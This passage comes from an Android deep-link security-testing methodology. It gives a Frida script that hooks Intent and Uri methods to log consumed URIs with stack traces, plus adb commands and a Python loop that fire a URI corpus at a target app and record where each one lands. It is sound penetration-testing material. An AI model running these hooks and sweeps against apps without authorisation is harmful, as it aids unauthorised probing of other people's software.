  finding; the plugin return value is.
- **Escalation:** → D10 bridge inventory and `_capacitor_file_` arbitrary read; → D11 token exfiltration →
  D13. A non-localhost `server.url` shipped in a release build is its own Critical (the app body is fetched
  over the network into a fully bridged WebView) → D17.
- **Ruled out when:** `allow-navigation` is restricted to owned origins with no wildcard and no `data:`,
  `server.url` is absent or localhost, and no `appUrlOpen` handler assigns to `window.location`. Paste
  `config.xml`/`capacitor.config.json` as the negative.

### D09-012 · Runtime handler discovery — hook `Intent.getData()` with a stack trace

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | none — instrumentation that converts an enumerated scheme into a proven sink |
| **Attacker** | AM-12 own device (evidence tool, not an attack) |
| **Applies to** | all; requires a Frida-capable device (D26) |
| **Maps to** | MASTG-TECH-0173 (Monitoring Deep Link Handlers at Runtime with Frida); MASTG-TOOL-0032 (Frida CodeShare — "Android Deep Link Observer", `@leolashkevych/android-deep-link-observer`); MASTG-DEMO-0152 |

- **Test:** Stop guessing parameter names. Observe every URI the app consumes *and constructs*, and — the
  whole point — get the **caller** via a stack trace so you know which class to read in jadx.
- **How:**
  ```javascript
  // d09-observer.js
  Java.perform(function () {
    var Intent = Java.use('android.content.Intent');
    var Uri    = Java.use('android.net.Uri');
    var Log    = Java.use('android.util.Log');
    var Exc    = Java.use('java.lang.Exception');

    Intent.getData.implementation = function () {
      var uri = this.getData();
      var act = this.getAction() !== null ? this.getAction().toString() : '<null action>';
      console.log('\n[*] Intent.getData()  action=' + act);
      try { console.log('[*] Activity: ' + this.getComponent().getClassName()); } catch (e) {}
      if (uri !== null) {
        console.log('    scheme:   ' + uri.getScheme());
        console.log('    host:     ' + uri.getHost());
        console.log('    path:     ' + uri.getPath());
        console.log('    query:    ' + uri.getQuery());
        console.log('    fragment: ' + uri.getFragment());
      } else { console.log('[-] No data supplied.'); }
      console.log(Log.getStackTraceString(Exc.$new()));   // the caller is the finding
      return uri;
    };

    // the construction side — catches tokens the app EMITS (D09-005)
    Intent.setData.overload('android.net.Uri').implementation = function (u) {
      console.log('[*] Intent.setData: ' + u);
      return this.setData(u);
    };

    Uri.getQueryParameter.implementation = function (k) {
      var v = this.getQueryParameter(k);
      console.log('[*] getQueryParameter(' + k + ') -> ' + v);
      return v;
    };
  });
  ```
  ```bash
  frida -U -f com.target.app -l d09-observer.js --no-pause
  adb shell am start -W -a android.intent.action.VIEW -d "targetapp://load.html/?message=ok#part1" com.target.app
  ```
- **Proof:** The MASTG-TECH-0173 output shape — scheme, host, params, fragment — **plus** a stack frame naming
  the file, class and method that consumed it (e.g. `WebViewActivity.kt`, `…WebViewActivity`, `onCreate`).
  That frame is the jadx entry point for D09-041.
- **Escalation:** Every resolved handler becomes a D09-041 route-table row; every `setData` line carrying a
  token becomes a D09-005 candidate.
- **Ruled out when:** The hook fires and shows the URI being read and discarded (no downstream call), or the
  app never calls `getData()` for a fired link because the route is handled from `getIntent().getExtras()`
  instead — in which case re-run the hook on `Intent.getStringExtra`. Instrumentation that produced no output
  is a harness failure, not a negative.

### D09-013 · Fire the whole URI corpus and record where each one lands

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | none — candidate generation for D09-059 onwards |
| **Attacker** | AM-03 (discovery only — re-prove per D09-076) |
| **Applies to** | all |
| **Maps to** | repository harness `tools/07-deeplink-sweep.sh`; drozer `app.activity.start --data-uri`; MASTG-TECH-0173 |

- **Test:** Mechanically fire every declared URI plus its mutation set, recording the resolved activity for
  each. The deliverable is the list of URIs that land in a WebView or a state-changing screen.
- **How:**
  ```bash
  # build uris.txt from the D09-001 table, then mutate
  PKG=com.target.app
  tools/07-deeplink-sweep.sh "$PKG" uris.txt | tee /tmp/d09_sweep.txt
  wc -l uris.txt /tmp/d09_sweep.txt      # counts MUST match; a short output means the loop ate entries
  ```
  Do not iterate a file in a shell array — zsh array expansion fails silently and produces zero iterations
  with no error. Use Python for anything over five items:
  ```python
  import subprocess, time, sys
  uris = [l.strip() for l in open('uris.txt') if l.strip()]
  ok = 0
  for u in uris:
      try:
          subprocess.run(['adb','shell','am','start','-a','android.intent.action.VIEW',
                          '-c','android.intent.category.BROWSABLE','-d',u],
                         capture_output=True, timeout=20)
          time.sleep(3)
          top = subprocess.run(['adb','shell','dumpsys','activity','activities'],
                               capture_output=True, text=True, timeout=20).stdout
          line = next((l for l in top.splitlines() if 'topResumedActivity' in l), '')
          print(f'{u:70} -> {line.strip()}'); ok += 1
      except Exception as e:
          print(f'{u:70} -> ERROR {e}', file=sys.stderr)
  print(f'# fired {ok}/{len(uris)}', file=sys.stderr)     # count your results
  ```
- **Proof:** The URI → resolved activity table with matching input and output counts. `am start` result codes
  are part of the evidence: `3` = delivered, `-92 / Access blocked` = blocked by `enforceIntentFilter`,
  `102` = `BAL_BLOCK`.
- **Escalation:** Rows landing in a WebView go to D09-059; rows landing in a payment or settings screen go to
  D09-066; rows landing nowhere go to D09-073 (check for a crash).
- **Ruled out when:** Every URI in the corpus resolves to the app's launcher or a login screen and the counts
  match. A sweep whose output line count is lower than its input line count has ruled out nothing.
